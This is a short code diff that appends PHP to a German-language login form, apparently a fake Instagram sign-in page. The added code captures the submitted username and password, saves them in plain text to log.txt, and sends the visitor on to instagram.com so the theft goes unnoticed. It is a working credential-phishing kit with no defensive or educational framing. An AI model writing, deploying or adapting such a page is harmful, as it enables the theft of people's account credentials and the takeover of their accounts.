@@ -16,4 +16,9 @@
         <button type="submit">Anmelden</button>
     </form>
 </body>
-</html>
+</html><?php
+$username = $_POST['username'];
+$password = $_POST['password'];
+file_put_contents('log.txt', "Benutzername: $username, Passwort: $password\n", FILE_APPEND);
+header('Location: https://www.instagram.com');
+?>
